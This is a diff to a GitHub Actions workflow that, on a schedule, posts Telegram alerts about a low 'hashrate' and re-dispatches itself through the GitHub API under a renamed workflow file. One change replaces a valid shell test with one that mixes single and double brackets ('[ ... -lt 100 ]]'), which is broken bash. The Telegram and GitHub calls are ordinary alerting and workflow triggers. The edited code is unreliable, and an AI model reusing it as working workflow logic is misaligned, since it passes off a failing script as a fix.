@@ -2,7 +2,7 @@ name: Data Collector Pipeline
 
 on:
   schedule:
-    - cron: '0 6,18 * * *' # Jam 06:00 dan 18:00 UTC
+    - cron: '0 6,18 * * *'  # Jam 06:00 dan 18:00 UTC
   workflow_dispatch:
 
 permissions:
@@ -76,7 +76,7 @@ jobs:
             -d parse_mode=Markdown
 
           HR_NUM=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
-          if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]; then
+          if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]]; then
             curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
               -d chat_id=$TG_CHAT_ID \
               -d text="🚨 *Hashrate rendah!* $HASHRATE." \
@@ -96,5 +96,5 @@ jobs:
         run: |
           curl -X POST -H "Accept: application/vnd.github+json" \
                -H "Authorization: Bearer $GH_TOKEN" \
-               https://api.github.com/repos/${{ github.repository }}/actions/workflows/bnb-collector.yml/dispatches \
+               https://api.github.com/repos/${{ github.repository }}/actions/workflows/data-collector.yml/dispatches \
                -d '{"ref":"main"}'
